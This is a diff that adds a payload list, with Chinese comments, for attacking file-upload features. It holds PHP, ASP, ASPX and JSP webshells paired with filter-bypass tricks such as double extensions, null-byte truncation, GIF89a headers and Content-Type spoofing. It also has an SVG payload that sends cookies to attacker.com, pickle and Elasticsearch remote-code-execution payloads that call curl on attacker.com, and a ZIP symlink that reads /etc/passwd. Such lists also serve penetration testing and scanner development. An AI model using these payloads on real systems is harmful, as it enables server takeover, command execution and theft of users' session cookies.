@@ -1,0 +1,32 @@
+# 文件上传 - PHP 双扩展名绕过 (shell.php.jpg) + Webshell
+shell.php.jpg <?php system($_GET[1]);?>
+# 文件上传 - PHP 后缀空格点号截断 (shell.php.) + Webshell
+shell.php. <?php system($_GET[1]);?>
+# 文件上传 - PHP phtml 扩展名绕过 + Webshell
+shell.phtml <?php system($_GET[1]);?>
+# 文件上传 - ASPX webshell 上传执行系统命令
+shell.aspx <%@ Page Language="C#"%><%System.Diagnostics.Process.Start("cmd.exe","/c whoami");%>
+# 文件上传 - JSP webshell 上传反弹 Shell
+shell.jsp <% Runtime.getRuntime().exec("curl http://attacker.com/$(whoami)"); %>
+# 文件上传 - SVG XSS 文件上传窃取 Cookie
+<svg xmlns="http://www.w3.org/2000/svg" onload="new Image().src='http://attacker.com/c?'+document.cookie"/>
+# 文件上传 - 图片马 GIF89a 头绕过 getimagesize() + Webshell
+GIF89a<?php system($_GET[1]);?>
+# 文件上传 - 空字节截断 shell.php%00.jpg + Webshell
+shell.php%00.jpg <?php system($_GET[1]);?>
+# 文件上传 - IIS 6.0 分号绕过 (shell.asp;.jpg) + Webshell
+shell.asp;.jpg <% Execute(Request("cmd")) %>
+# 文件上传 - Content-Type 伪造 image/jpeg + Webshell
+Content-Type: image/jpeg <?php system($_GET[1]);?>
+# 文件上传 - PHP7/PHP8 pht 扩展名绕过 + Webshell
+shell.pht <?php system($_GET[1]);?>
+# 文件上传 - Python pickle 文件反序列化 RCE
+model.pkl cos\nsystem\n(S'curl http://attacker.com/$(whoami)'\ntR.
+# 文件上传 - ASP webshell (shell.cer 证书文件绕过)
+shell.cer <% Execute(Request("cmd")) %>
+# 文件上传 - Nginx 请求体临时文件 + LFI Getshell 组合利用
+/tmp/nginx/body/0000000001 <?php system($_GET[1]);?>
+# 文件上传 - ZIP 符号链接攻击读取 /etc/passwd
+symlink.zip [ZIP containing symlink: ../../etc/passwd]
+# 文件上传 - Elasticsearch 动态脚本上传 RCE
+script.json {"script":{"lang":"painless","source":"java.lang.Runtime.getRuntime().exec('curl http://attacker.com/$(whoami)')"}}
